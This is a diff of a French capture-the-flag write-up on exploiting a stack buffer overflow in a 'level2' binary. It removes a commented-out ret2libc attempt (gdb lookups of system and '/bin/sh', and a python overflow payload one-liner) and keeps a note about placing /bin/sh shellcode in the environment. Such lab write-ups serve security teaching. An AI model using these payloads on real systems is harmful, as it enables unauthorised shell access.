@@ -63,21 +63,6 @@ Même réflexes que pour les levels précédents :
 
 -  On peut observer avant l'appel du printf une comparaison : le programme vérifie qu'il ne copie pas une adresse de la stack (commençant par *0xb*)
     >    0x08048500 <+44>:	cmp    eax,0xb0000000
-<!-- 
-- Dans gdb :
-   -- `gdb-peda$ p system`
-     > $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
-  - `gdb-peda$ searchmem /bin/sh`
-    ```
-      Searching for '/bin/sh' in: None ranges
-      Found 1 results, display max 1 items:
-      libc : 0xb7f8cc58 ("/bin/sh")
-    ```
-  - `(python -c "print('A'*(76+4)+'\x60\xb0\xe6\xb7'+'....'+'\x58\xcc\xf8\xb7')" ; cat) | ./level2`
-    NOPE....
- -->
-
------------------
 
 - La vérification empêche de faire appel à une adresse située sur la stack, mais on peut sauvegarder un shellcode appelant */bin/sh* dans l'env :
   ```
